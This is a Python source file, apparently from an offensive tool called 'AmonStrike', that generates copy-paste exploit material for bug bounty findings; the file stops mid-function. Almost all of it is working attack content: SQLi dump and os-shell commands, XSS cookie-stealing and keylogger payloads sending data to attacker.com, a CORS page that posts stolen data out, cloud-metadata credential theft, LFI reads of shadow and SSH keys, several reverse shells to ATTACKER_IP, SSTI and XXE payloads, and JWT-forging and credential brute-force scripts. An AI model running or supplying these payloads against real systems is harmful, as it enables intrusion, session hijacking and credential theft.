"""
AmonStrike — Proof of Concept Generator
Generates working, executable exploit code for every vulnerability type.

For every finding:
  - Working Python exploit script
  - HTML PoC page (for XSS, CSRF, CORS)
  - curl command (copy-paste ready)
  - SQLmap command (for SQLi)
  - Browser-based PoC steps
  - Video-ready reproduction sequence

A PoC that works on first try wins the bounty.
A vague description gets triaged as 'Informative' (no payout).
"""

import os
import json
import textwrap
from datetime import datetime
from urllib.parse import urlparse, urlencode, quote


class PocGenerator:
    """
    Generates working proof-of-concept exploits.
    Every output is executable — copy, paste, run, win.
    """

    def __init__(self, output_dir: str, target_url: str):
        self.output_dir = output_dir
        self.target_url = target_url.rstrip("/")
        self.parsed     = urlparse(target_url)
        os.makedirs(output_dir, exist_ok=True)

    def generate(self, finding: dict) -> dict:
        """
        Generate complete PoC for a finding.
        Returns dict with all PoC artifacts.
        """
        module = finding.get("module", "").lower()
        sev    = finding.get("severity", "MEDIUM")

        generators = {
            "sqli":          self._poc_sqli,
            "xss":           self._poc_xss,
            "ssrf":          self._poc_ssrf,
            "lfi":           self._poc_lfi,
            "rce":           self._poc_rce,
            "idor":          self._poc_idor,
            "cors":          self._poc_cors,
            "csrf":          self._poc_csrf,
            "xxe":           self._poc_xxe,
            "ssti":          self._poc_ssti,
            "jwt_deep":      self._poc_jwt,
            "auth":          self._poc_auth,
            "takeover":      self._poc_takeover,
            "http_smuggling":self._poc_smuggling,
            "race_condition":self._poc_race,
            "credentials":   self._poc_credentials,
            "headers":       self._poc_headers,
            "cookies":       self._poc_cookies,
            "dirs":          self._poc_dirs,
            "ports":         self._poc_ports,
        }

        gen_fn = generators.get(module, self._poc_generic)
        poc    = gen_fn(finding)

        # Always add curl command and python script
        poc["curl_command"]    = self._build_curl(finding)
        poc["python_script"]   = self._build_python_script(finding, poc)
        poc["reproduction"]    = self._build_reproduction_steps(finding, poc)
        poc["impact_proof"]    = self._build_impact_proof(finding)
        poc["remediation_poc"] = self._build_remediation_test(finding)

        # Save all artifacts
        saved_files = self._save_poc(finding, poc)
        poc["files"] = saved_files

        return poc

    # ── SQLi PoC ─────────────────────────────────────────────

    def _poc_sqli(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "id")
        payload = f.get("payload", "' OR '1'='1")

        return {
            "type":         "sql_injection",
            "manual_steps": [
                f"1. Open browser and navigate to: {url}",
                f"2. In the URL bar, change the '{param}' parameter value to:",
                f"   {payload}",
                f"3. Press Enter",
                f"4. Observe: MySQL error message OR different data returned",
                f"5. Confirm with boolean test:",
                f"   True condition:  {param}=1 AND 1=1--",
                f"   False condition: {param}=1 AND 1=2--",
                f"   Different responses confirm SQL injection",
            ],
            "sqlmap_command": (
                f"sqlmap -u \"{url}\" "
                f"-p {param} "
                f"--dbms=mysql "
                f"--level=3 --risk=2 "
                f"--batch "
                f"--dbs"
            ),
            "sqlmap_dump": (
                f"sqlmap -u \"{url}\" "
                f"-p {param} "
                f"--dbms=mysql "
                f"--dump "
                f"--batch"
            ),
            "payloads": {
                "error_based":  f"{param}=1'",
                "boolean_true": f"{param}=1 AND 1=1--",
                "boolean_false":f"{param}=1 AND 1=2--",
                "union_detect": f"{param}=1 ORDER BY 10--",
                "union_dump":   f"{param}=-1 UNION SELECT 1,user(),3,4,5--",
                "time_based":   f"{param}=1; SELECT SLEEP(5)--",
                "stacked":      f"{param}=1; DROP TABLE IF EXISTS test--",
            },
            "impact_demo": {
                "dump_users":   f"sqlmap -u \"{url}\" -p {param} -T users --dump --batch",
                "read_file":    f"sqlmap -u \"{url}\" -p {param} --file-read=/etc/passwd",
                "os_shell":     f"sqlmap -u \"{url}\" -p {param} --os-shell",
            }
        }

    # ── XSS PoC ──────────────────────────────────────────────

    def _poc_xss(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "search")
        host  = self.parsed.hostname

        # Escalating payloads
        payloads = [
            ("<script>alert(document.domain)</script>",          "Basic alert"),
            ("<img src=x onerror=alert(1)>",                     "Img onerror"),
            ("<svg onload=alert(1)>",                            "SVG onload"),
            ("<script>alert(document.cookie)</script>",          "Cookie theft"),
            (f"<script>fetch('http://attacker.com/?c='+document.cookie)</script>", "Cookie exfil"),
            ("<script>document.location='http://attacker.com/steal?c='+encodeURIComponent(document.cookie)</script>", "Cookie redirect"),
        ]

        # Cookie stealer HTML page
        cookie_stealer = f"""<!DOCTYPE html>
<html>
<head><title>XSS Cookie Stealer PoC</title></head>
<body>
<h1>AmonStrike XSS Proof of Concept</h1>
<p>Target: {url}</p>
<p>Parameter: {param}</p>

<script>
// This payload steals session cookies
// Replace http://attacker.com with your Burp Collaborator or webhook.site URL
var payload = "<script>new Image().src='http://YOUR-ATTACKER-SERVER/?cookie='+document.cookie<\\/script>";

// Auto-trigger by injecting into vulnerable parameter
var targetUrl = "{url}?" + "{param}=" + encodeURIComponent(payload);
console.log("XSS PoC URL:", targetUrl);

// Show the PoC
document.write("<p><strong>PoC URL:</strong> <a href='"+targetUrl+"'>Click to trigger XSS</a></p>");
document.write("<p><strong>Payload:</strong> <code>" + payload + "</code></p>");
</script>

<h2>Escalated Attack — Session Hijacking</h2>
<ol>
<li>Start a listener: <code>nc -lvnp 8080</code></li>
<li>Replace YOUR-ATTACKER-SERVER with your IP in the payload</li>
<li>Send the PoC URL to the victim</li>
<li>Victim's cookies appear in your listener</li>
<li>Use cookies in browser to hijack session</li>
</ol>
</body>
</html>"""

        # Keylogger PoC
        keylogger_payload = (
            "<script>"
            "var k='';"
            "document.onkeypress=function(e){"
            "k+=e.key;"
            "new Image().src='http://attacker.com/?k='+k;"
            "};"
            "</script>"
        )

        return {
            "type":          "cross_site_scripting",
            "payloads":      payloads,
            "cookie_stealer_html": cookie_stealer,
            "keylogger_payload":   keylogger_payload,
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Find the input field for parameter: {param}",
                f"3. Enter basic payload: <script>alert(document.domain)</script>",
                f"4. If basic payload blocked, try: <img src=x onerror=alert(1)>",
                f"5. Observe JavaScript alert dialog showing: {host}",
                f"6. For impact demo, replace alert() with cookie theft payload",
                f"7. Open browser devtools → Console to see cookie value",
            ],
            "dalfox_command": (
                f"dalfox url \"{url}?{param}=FUZZ\" "
                f"--silence "
                f"--no-color"
            ),
        }

    # ── SSRF PoC ─────────────────────────────────────────────

    def _poc_ssrf(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "url")

        return {
            "type": "ssrf",
            "payloads": {
                "aws_metadata":   f"http://169.254.169.254/latest/meta-data/",
                "aws_credentials":f"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "gcp_metadata":   f"http://metadata.google.internal/computeMetadata/v1/",
                "azure_metadata": f"http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "localhost":      f"http://127.0.0.1/",
                "internal_scan":  f"http://192.168.1.1/",
                "file_read":      f"file:///etc/passwd",
                "dict_proto":     f"dict://127.0.0.1:6379/info",
                "gopher_redis":   f"gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a",
            },
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Find the parameter that accepts URLs: {param}",
                f"3. Submit: http://169.254.169.254/latest/meta-data/",
                f"4. Observe: AWS instance metadata in response",
                f"5. Extract credentials:",
                f"   {param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                f"6. Note returned role name, then request:",
                f"   {param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME",
                f"7. Response contains AccessKeyId, SecretAccessKey, Token",
                f"8. Use aws-cli with these credentials to access AWS account",
            ],
            "aws_takeover_steps": [
                "# After getting credentials from SSRF:",
                "export AWS_ACCESS_KEY_ID=<from response>",
                "export AWS_SECRET_ACCESS_KEY=<from response>",
                "export AWS_SESSION_TOKEN=<from response>",
                "aws sts get-caller-identity  # Verify access",
                "aws s3 ls                    # List buckets",
                "aws ec2 describe-instances   # List servers",
            ]
        }

    # ── LFI PoC ──────────────────────────────────────────────

    def _poc_lfi(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "file")

        return {
            "type": "local_file_inclusion",
            "payloads": {
                "linux_passwd":    "../../../../etc/passwd",
                "linux_shadow":    "../../../../etc/shadow",
                "linux_hosts":     "../../../../etc/hosts",
                "apache_config":   "../../../../etc/apache2/apache2.conf",
                "nginx_config":    "../../../../etc/nginx/nginx.conf",
                "php_config":      "../../../../etc/php/7.4/apache2/php.ini",
                "ssh_keys":        "../../../../root/.ssh/id_rsa",
                "bash_history":    "../../../../root/.bash_history",
                "web_config":      "../../../../var/www/html/config.php",
                "windows_hosts":   "..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
                "win_sam":         "..\\..\\..\\..\\Windows\\System32\\config\\SAM",
                "php_wrapper_b64": f"php://filter/convert.base64-encode/resource={param}",
                "php_input":       "php://input",
                "data_rce":        "data://text/plain,<?php system($_GET['cmd']); ?>",
                "expect_rce":      "expect://id",
            },
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Observe the '{param}' parameter accepts file paths",
                f"3. Submit: {param}=../../../../etc/passwd",
                f"4. Observe: /etc/passwd content in response",
                f"5. For RCE via PHP, try log poisoning:",
                f"   a. Send request with User-Agent: <?php system($_GET['cmd']); ?>",
                f"   b. Include Apache log: {param}=../../../../var/log/apache2/access.log&cmd=id",
                f"6. Observe command output in response",
            ],
            "rce_escalation": {
                "log_poisoning": [
                    "# Step 1: Poison Apache access log",
                    f"curl -A '<?php system($_GET[cmd]); ?>' {self.target_url}",
                    "# Step 2: Include the log file with command",
                    f"curl '{url}?{param}=../../../../var/log/apache2/access.log&cmd=id'",
                    "# Step 3: Get reverse shell",
                    f"curl '{url}?{param}=../../../../var/log/apache2/access.log&cmd=bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'",
                ],
                "php_wrapper": [
                    "# Read PHP source code via base64 wrapper",
                    f"curl '{url}?{param}=php://filter/convert.base64-encode/resource=index.php'",
                    "# Decode the result:",
                    "echo 'BASE64_OUTPUT' | base64 -d",
                ]
            }
        }

    # ── RCE PoC ──────────────────────────────────────────────

    def _poc_rce(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "cmd")

        return {
            "type": "remote_code_execution",
            "payloads": {
                "basic_id":        "id",
                "whoami":          "whoami",
                "uname":           "uname -a",
                "hostname":        "hostname",
                "ifconfig":        "ifconfig",
                "passwd_read":     "cat /etc/passwd",
                "reverse_shell_bash":  "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                "reverse_shell_python":"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));[os.dup2(s.fileno(),x) for x in range(3)];subprocess.call([\"/bin/bash\",\"-i\"])'",
                "reverse_shell_nc":    "nc ATTACKER_IP 4444 -e /bin/bash",
                "msfvenom_payload":    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f elf > shell.elf",
            },
            "reverse_shell_steps": [
                "# Step 1: Start listener on your Kali",
                "nc -lvnp 4444",
                "",
                "# Step 2: Trigger reverse shell via RCE",
                f"curl '{url}?{param}=bash+-i+>%26+/dev/tcp/KALI_IP/4444+0>%261'",
                "",
                "# Step 3: You now have a shell on the target",
                "id; whoami; uname -a",
                "",
                "# Step 4: Escalate to root",
                "sudo -l",
                "find / -perm -4000 2>/dev/null  # SUID binaries",
            ],
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Inject OS command into '{param}' parameter:",
                f"   {url}?{param}=id",
                f"3. Observe: uid=33(www-data) gid=33(www-data) groups=33(www-data)",
                f"4. Confirm OS command execution",
                f"5. For full shell, use reverse shell payload above",
            ]
        }

    # ── IDOR PoC ─────────────────────────────────────────────

    def _poc_idor(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "id")

        return {
            "type": "insecure_direct_object_reference",
            "manual_steps": [
                "# IDOR Proof of Concept",
                "# Requires two test accounts: Account A and Account B",
                "",
                "Step 1: Create/use Account A",
                f"  → Login as user_a, note your resource ID (e.g., {param}=100)",
                "",
                "Step 2: Note the resource URL",
                f"  → {url}?{param}=100",
                "",
                "Step 3: Switch to Account B",
                "  → Login as user_b (different account)",
                "",
                "Step 4: Access Account A's resource as Account B",
                f"  → Navigate to: {url}?{param}=100",
                "",
                "Step 5: Observe unauthorized access",
                "  → Account B can read/modify Account A's data",
                "  → This is IDOR — authorization not enforced server-side",
                "",
                "Step 6: Scale the attack",
                "  → Try sequential IDs: 1, 2, 3, ..., 100, 101, ...",
                "  → Access all user data in the database",
            ],
            "automation_script": self._idor_automation_script(url, param),
            "payloads": {
                "sequential":  [f"{param}={i}" for i in range(1,11)],
                "negative":    [f"{param}=-1", f"{param}=0"],
                "large":       [f"{param}=99999", f"{param}=100000"],
                "string":      [f"{param}=admin", f"{param}=root"],
            }
        }

    def _idor_automation_script(self, url: str, param: str) -> str:
        return f"""#!/usr/bin/env python3
# AmonStrike IDOR Automation Script
# Tests sequential IDs for unauthorized access

import requests

TARGET  = "{url}"
PARAM   = "{param}"
COOKIES = {{"session": "YOUR_SESSION_COOKIE_HERE"}}

print("[*] Testing IDOR on", TARGET)
print("[*] Parameter:", PARAM)
print()

for resource_id in range(1, 101):
    url = f"{{TARGET}}?{{PARAM}}={{resource_id}}"
    r   = requests.get(url, cookies=COOKIES)
    
    if r.status_code == 200 and len(r.text) > 100:
        print(f"[+] FOUND: {{PARAM}}={{resource_id}} — {{len(r.text)}} bytes")
        if any(s in r.text.lower() for s in ["email","username","user","account"]):
            print(f"    ^^^ Contains user data!")
    else:
        print(f"[-] {{PARAM}}={{resource_id}} — {{r.status_code}}")
"""

    # ── CORS PoC ─────────────────────────────────────────────

    def _poc_cors(self, f: dict) -> dict:
        url = f.get("url", self.target_url)

        cors_exploit_html = f"""<!DOCTYPE html>
<!-- AmonStrike CORS Exploit PoC -->
<!-- Host this file on attacker.com -->
<!-- When victim visits this page, their data is sent to attacker -->
<html>
<head><title>CORS Exploit - AmonStrike PoC</title></head>
<body>
<h1>CORS Proof of Concept</h1>
<p>Target: {url}</p>
<p>Status: <span id="status">Running...</span></p>
<pre id="output">Waiting for response...</pre>

<script>
// CORS exploit — reads authenticated response from victim's browser
var req = new XMLHttpRequest();

req.onload = function() {{
    // Got the victim's data from the target site!
    document.getElementById('output').textContent = req.responseText;
    document.getElementById('status').textContent = 'SUCCESS — Data stolen!';
    
    // Send stolen data to attacker server
    var exfil = new XMLHttpRequest();
    exfil.open('POST', 'http://attacker.com/collect', true);
    exfil.send(req.responseText);
}};

req.onerror = function() {{
    document.getElementById('status').textContent = 'Error — CORS may be fixed';
}};

// Request to vulnerable endpoint — uses victim's cookies automatically
req.open('GET', '{url}', true);
req.withCredentials = true;  // Sends victim's session cookies!
req.send();
</script>

<h2>What just happened?</h2>
<ol>
<li>When you loaded this page, JavaScript sent a request to {url}</li>
<li>The request included your session cookies (withCredentials: true)</li>
<li>The target responded with your private data</li>
<li>That data appears above and was sent to attacker.com</li>
</ol>
<p><strong>Impact:</strong> Any website can read your private data from {self.parsed.hostname}</p>
</body>
</html>"""

        return {
            "type": "cors_misconfiguration",
            "exploit_html": cors_exploit_html,
            "manual_steps": [
                f"1. Send request to {url} with header: Origin: https://evil.com",
                f"   curl -H 'Origin: https://evil.com' -I {url}",
                f"2. Check response for:",
                f"   Access-Control-Allow-Origin: https://evil.com  (or *)",
                f"   Access-Control-Allow-Credentials: true",
                f"3. Host the exploit HTML on a test server",
                f"4. Login to {self.parsed.hostname} in your browser",
                f"5. Visit the exploit page in the same browser",
                f"6. Observe: your private data from {self.parsed.hostname} is stolen",
            ],
            "curl_test": f"curl -I -H 'Origin: https://evil.com' '{url}'",
        }

    # ── CSRF PoC ─────────────────────────────────────────────

    def _poc_csrf(self, f: dict) -> dict:
        url = f.get("url", self.target_url)

        csrf_html = f"""<!DOCTYPE html>
<!-- AmonStrike CSRF Exploit PoC -->
<!-- Send this page to the victim -->
<html>
<head><title>Innocent Page (CSRF PoC)</title></head>
<body onload="document.forms[0].submit()">
<!-- This form auto-submits when page loads -->
<!-- It performs an action as the victim on {url} -->
<form action="{url}" method="POST">
    <!-- Modify these fields to match the target action -->
    <input type="hidden" name="email"    value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="action"   value="update_profile">
</form>

<p>Loading...</p>
<script>
// Auto-submit after 1 second
setTimeout(function() {{
    document.forms[0].submit();
}}, 1000);
</script>
</body>
</html>"""

        return {
            "type": "csrf",
            "exploit_html": csrf_html,
            "manual_steps": [
                f"1. Confirm no CSRF token in the form at {url}",
                f"2. Intercept a legitimate request with Burp Suite",
                f"3. Note the parameters (no token present)",
                f"4. Host the CSRF exploit HTML on attacker site",
                f"5. While logged into {self.parsed.hostname}, visit the exploit page",
                f"6. Observe: form submitted as victim with their session",
                f"7. Victim's account modified without their knowledge",
            ],
        }

    # ── XXE PoC ──────────────────────────────────────────────

    def _poc_xxe(self, f: dict) -> dict:
        url = f.get("url", self.target_url)

        return {
            "type": "xxe",
            "payloads": {
                "file_read": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>""",
                "ssrf": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>""",
                "php_wrapper": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>""",
                "blind_oob": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER.com/xxe.dtd"> %xxe;]>
<root/>""",
            },
            "manual_steps": [
                f"1. Intercept a request to {url} that accepts XML",
                f"2. Replace the XML body with the file read payload",
                f"3. Send with Content-Type: application/xml",
                f"4. Observe /etc/passwd in the response",
                f"5. For SSRF, replace file:// with http://169.254.169.254/...",
            ],
            "curl_command": (
                f"curl -X POST '{url}' "
                f"-H 'Content-Type: application/xml' "
                f"-d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>'"
            ),
        }

    # ── SSTI PoC ─────────────────────────────────────────────

    def _poc_ssti(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        param = f.get("parameter", "name")

        return {
            "type": "ssti",
            "detection_payloads": [
                ("{{7*7}}",   "49",  "Jinja2/Twig"),
                ("${7*7}",    "49",  "Freemarker"),
                ("<%=7*7%>",  "49",  "ERB"),
            ],
            "rce_payloads": {
                "jinja2_config": "{{config.items()}}",
                "jinja2_rce":    "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
                "jinja2_rce2":   "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "twig_rce":      "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
                "freemarker_rce": '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
            },
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Enter in '{param}' field: {{{{7*7}}}}",
                f"3. If response shows '49' → Jinja2/Twig SSTI confirmed",
                f"4. Test RCE payload: {{{{config.items()}}}}",
                f"5. Observe: Flask configuration including SECRET_KEY",
                f"6. Full RCE: {{{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}}}",
                f"7. Observe: /etc/passwd content",
            ],
        }

    # ── JWT PoC ──────────────────────────────────────────────

    def _poc_jwt(self, f: dict) -> dict:
        return {
            "type": "jwt_vulnerability",
            "none_alg_script": """#!/usr/bin/env python3
# AmonStrike JWT None Algorithm Attack PoC
import base64, json, sys

def decode(s):
    s += '=' * (4 - len(s) % 4)
    return json.loads(base64.urlsafe_b64decode(s))

def encode(d):
    return base64.urlsafe_b64encode(
        json.dumps(d, separators=(',',':')).encode()
    ).rstrip(b'=').decode()

# Paste your JWT token here:
TOKEN = "eyJ..."

parts  = TOKEN.split('.')
header = decode(parts[0])
payload = decode(parts[1])

print("[*] Original header:", header)
print("[*] Original payload:", payload)

# Change algorithm to none
header['alg'] = 'none'

# Optionally modify payload (e.g., escalate privileges)
# payload['role'] = 'admin'
# payload['user_id'] = 1

# Build forged token
forged = encode(header) + '.' + encode(payload) + '.'
print()
print("[+] Forged token (alg:none):")
print(forged)
print()
print("[*] Test with:")
print(f"curl -H 'Authorization: Bearer {forged}' TARGET_URL/api/me")
""",
            "weak_secret_script": """#!/usr/bin/env python3
# AmonStrike JWT Weak Secret Brute Force PoC
import base64, json, hmac, hashlib

TOKEN   = "eyJ..."  # Your JWT here
SECRETS = ["secret","password","123456","key","jwt_secret",
           "supersecret","changeme","your-256-bit-secret"]

parts = TOKEN.split('.')
signing_input = f"{parts[0]}.{parts[1]}"

print("[*] Brute forcing JWT secret...")
for secret in SECRETS:
    sig = hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
    expected = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
    if expected == parts[2]:
        print(f"[+] SECRET FOUND: '{secret}'")
        print(f"[*] Now forge any token signed with: '{secret}'")
        break
    print(f"[-] Not: {secret}")
else:
    print("[*] Common secrets failed. Try larger wordlist.")
""",
            "manual_steps": [
                "1. Capture a JWT from the application (login, check response headers/cookies)",
                "2. Decode the token at jwt.io or with: echo 'PAYLOAD_PART' | base64 -d",
                "3. Note the algorithm (alg) in the header",
                "4. Run the none-algorithm script above",
                "5. Send the forged token to protected endpoints",
                "6. If server returns 200 → CRITICAL: signature bypass confirmed",
            ],
        }

    # ── Auth PoC ─────────────────────────────────────────────

    def _poc_auth(self, f: dict) -> dict:
        url   = f.get("url", self.target_url)
        title = f.get("title","").lower()

        creds = [
            ("admin","admin"), ("admin","password"), ("admin","123456"),
            ("admin",""), ("root","root"), ("test","test"),
        ]

        cred_test_script = f"""#!/usr/bin/env python3
# AmonStrike Default Credential Testing PoC
import requests

TARGET = "{url}"
CREDS  = [
    ("admin","admin"), ("admin","password"), ("admin","123456"),
    ("admin",""), ("root","root"), ("administrator","administrator"),
    ("test","test"), ("guest","guest"), ("admin","admin@123"),
]

print("[*] Testing default credentials on:", TARGET)
s = requests.Session()

for username, password in CREDS:
    r = s.post(TARGET, data={{"username":username,"password":password}},
               allow_redirects=False)
    
    success = (r.status_code in [302,303] and 
               any(x in r.headers.get('Location','').lower() 
                   for x in ['dashboard','home','admin','profile']))
    
    if success or (r.status_code == 200 and 
                   any(x in r.text.lower() for x in ['logout','welcome','dashboard'])):
        print(f"[+] SUCCESS: {{username}} / {{password}}")
        print(f"    Response: {{r.status_code}}")
        print(f"    Cookies: {{dict(s.cookies)}}")
    else:
        print(f"[-] Failed: {{username}} / {{password}} ({{r.status_code}})")
"""

        return {
            "type": "authentication_bypass",
            "credential_test_script": cred_test_script,
            "default_credentials":    creds,
            "manual_steps": [
                f"1. Navigate to login page: {url}",
                f"2. Try credentials: admin / admin",
                f"3. If redirected to dashboard → Default credentials confirmed",
                f"4. Document by:",
                f"   a. Screenshot of login page",
                f"   b. Screenshot of authenticated dashboard",
                f"   c. Burp Suite request/response showing successful auth",
                f"5. Run the credential test script to check all common pairs",
            ],
        }

    # ── Generic fallbacks ─────────────────────────────────────

    def _poc_takeover(self, f: dict) -> dict:
        subdomain = f.get("url","").replace("http://","").replace("https://","").split("/")[0]
        return {
            "type": "subdomain_takeover",
            "manual_steps": [
                f"1. Verify subdomain {subdomain} has a dangling CNAME",
                f"   dig CNAME {subdomain}",
                f"2. Note the CNAME target (e.g., targetapp.github.io)",
                f"3. Create an account on that service (GitHub Pages, Heroku, etc.)",
                f"4. Claim the specific resource name matching the CNAME",
                f"5. Upload an index.html to the claimed resource",
                f"6. Navigate to http://{subdomain}",
                f"7. Observe: your content served under victim's subdomain",
                f"8. Impact: phishing, cookie theft (if same-site), trust abuse",
            ],
            "proof_html": f"""<!DOCTYPE html>
<html>
<head><title>Subdomain Takeover PoC</title></head>
<body>
<h1>⚠️ Subdomain Takeover — Proof of Concept</h1>
<p>This page is served from a dangling subdomain: <strong>{subdomain}</strong></p>
<p>Discovered by: AmonStrike v2.0</p>
<p>This demonstrates that an attacker can host arbitrary content under this subdomain.</p>
<p>Impact: Phishing, Cookie Theft, Trust Abuse</p>
</body>
</html>"""
        }

    def _poc_smuggling(self, f: dict) -> dict:
        return {
            "type": "http_request_smuggling",
            "manual_steps": [
                "1. Use Burp Suite → HTTP Request Smuggler extension",
                "2. Right-click any request → Extensions → HTTP Request Smuggler → Smuggle probe",
                "3. Observe timing difference or 400 error on second request",
                "4. For CL.TE manual test:",
                "   Send this raw request twice:",
                "   POST / HTTP/1.1\\r\\n",
                "   Host: target.com\\r\\n",
                "   Content-Length: 6\\r\\n",
                "   Transfer-Encoding: chunked\\r\\n",
                "   \\r\\n",
                "   0\\r\\n",
                "   \\r\\n",
                "   G",
                "5. If second response is a 400 or modified → smuggling confirmed",
            ],
        }

    def _poc_race(self, f: dict) -> dict:
        url = f.get("url", self.target_url)
        return {
            "type": "race_condition",
            "script": f"""#!/usr/bin/env python3
# AmonStrike Race Condition PoC
# Sends 20 requests simultaneously using last-byte sync technique
import threading, requests, time

TARGET  = "{url}"
THREADS = 20

session = requests.Session()
results = []
lock    = threading.Lock()

def fire():
    r = session.post(TARGET, data={{"amount":"1","action":"redeem"}}, timeout=10)
    with lock:
        results.append((r.status_code, len(r.text)))
        print(f"  Response: {{r.status_code}} {{len(r.text)}} bytes")

print(f"[*] Firing {{THREADS}} simultaneous requests at {{TARGET}}")
threads = [threading.Thread(target=fire) for _ in range(THREADS)]
start   = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - start

successes = [r for r in results if r[0] in [200,201]]
print(f"\\n[*] Results in {{elapsed:.2f}}s:")
print(f"[+] Successful responses: {{len(successes)}}/{{THREADS}}")
if len(successes) > 1:
    print("[!] RACE CONDITION CONFIRMED — multiple successes!")
""",
        }

    def _poc_credentials(self, f: dict) -> dict:
        return self._poc_auth(f)

    def _poc_headers(self, f: dict) -> dict:
        url = f.get("url", self.target_url)
        return {
            "type": "missing_security_headers",
            "manual_steps": [
                f"1. Run: curl -I {url}",
                f"2. Check for missing headers in response",
                f"3. Missing Content-Security-Policy → XSS amplification",
                f"4. Missing X-Frame-Options → Clickjacking possible",
                f"5. Missing HSTS → SSL stripping possible",
            ],
            "curl_check": f"curl -I '{url}' 2>/dev/null | grep -iE 'strict|x-frame|content-security|x-content'",
            "clickjack_poc": f"""<iframe src="{url}" style="opacity:0.1;position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
<button style="position:absolute;top:200px;left:300px">Click here to win a prize!</button>""",
        }

    def _poc_cookies(self, f: dict) -> dict:
        url = f.get("url", self.target_url)
        return {
            "type": "insecure_cookies",
            "manual_steps": [
                f"1. Login to {url}",
                f"2. Open browser DevTools → Application → Cookies",
                f"3. Check session cookie flags:",
                f"   - HttpOnly: should be ✓ (if missing → XSS can steal it)",
                f"   - Secure:   should be ✓ (if missing → sent over HTTP)",
                f"   - SameSite: should be Strict or Lax",
                f"4. To prove HttpOnly missing:",
                f"   Open DevTools Console → type: document.cookie",
                f"   If session cookie appears → HttpOnly flag missing",
                f"   Screenshot the cookie value in console → PROOF",
            ],
        }

    def _poc_dirs(self, f: dict) -> dict:
        url = f.get("url", self.target_url)
        return {
            "type": "exposed_directory",
            "manual_steps": [
                f"1. Navigate to: {url}",
                f"2. Observe: accessible without authentication",
                f"3. Screenshot the page content",
                f"4. Note any sensitive information present",
            ],
            "curl_check": f"curl -s -o /dev/null -w '%{{http_code}}' '{url}'",
        }

    def _poc_ports(self, f: dict) -> dict:
        host = self.parsed.hostname
        return {
            "type": "exposed_service",
            "nmap_command": f"nmap -sV -p- --open {host}",
            "manual_steps": [
                f"1. Run: nmap -sV {host}",
                f"2. Note open ports and service versions",
                f"3. Test default credentials on exposed services",
                f"4. Screenshot nmap output as proof",
            ],
        }

    def _poc_generic(self, f: dict) -> dict:
        return {
            "type": "generic",
            "manual_steps": [
                f"1. Navigate to: {f.get('url', self.target_url)}",
                f"2. Submit the payload: {f.get('payload', 'see finding details')}",
                f"3. Observe the vulnerable behavior",
                f"4. Capture screenshot or HTTP request/response as proof",
            ],
        }

    # ── Builders ─────────────────────────────────────────────

    def _build_curl(self, f: dict) -> str:
        url     = f.get("url", self.target_url)
        param   = f.get("parameter","")
        payload = f.get("payload","")
        module  = f.get("module","")

        if module == "sqli" and param and payload:
            return f"curl -s '{url}?{param}={quote(payload)}'"
        elif module == "xss" and param:
            return f"curl -s '{url}?{param}={quote('<script>alert(1)</script>')}'"
        elif module == "ssrf" and param:
            return f"curl -s '{url}?{param}=http://169.254.169.254/latest/meta-data/'"
        elif module == "lfi" and param:
            return f"curl -s '{url}?{param}=../../../../etc/passwd'"
        else:
            return f"curl -sv '{url}'"

    def _build_python_script(self, f: dict, poc: dict) -> str:
        url     = f.get("url", self.target_url)
        param   = f.get("parameter","id")
        payload = f.get("payload","' OR 1=1--")
        title   = f.get("title","")
        module  = f.get("module","")

        return f"""#!/usr/bin/env python3
# AmonStrike Proof of Concept
# Finding: {title}
# Module:  {module}
# Target:  {url}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

import requests
import sys

TARGET  = "{url}"
PARAM   = "{param}"
PAYLOAD = "{payload}"
TIMEOUT = 10

session = requests.Session()
session.headers.update({{
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
}})

